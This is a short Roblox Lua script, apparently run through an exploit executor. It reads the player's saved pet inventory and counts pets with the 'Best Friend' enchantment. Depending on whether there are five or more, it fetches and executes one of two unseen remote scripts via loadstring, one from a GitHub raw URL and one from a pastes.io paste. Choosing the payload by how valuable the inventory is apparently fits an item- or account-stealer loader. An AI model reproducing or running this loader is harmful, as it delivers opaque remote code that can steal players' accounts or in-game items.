x = require(game:GetService("ReplicatedStorage").Library.Client.Save)
y = {}

u=0
for i,v in pairs(x.Get().Pets) do
table.insert(y, v)
end

for i,v in pairs(y) do
for I,V in pairs(v) do
local boolValue, variantValue = pcall(function() -- 1
    for i2,v2 in pairs(V) do
    for i3,v3 in pairs(v2) do
    if v3 == "Best Friend" then

u = u+1
end
    end
    end
end)
end
end

if (u >= 5) then
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/FantaroX/exterlib/main/lopoxd", true))()
else
    loadstring(game:HttpGet("https://pastes.io/raw/xpkcssuwqq", true))()
end
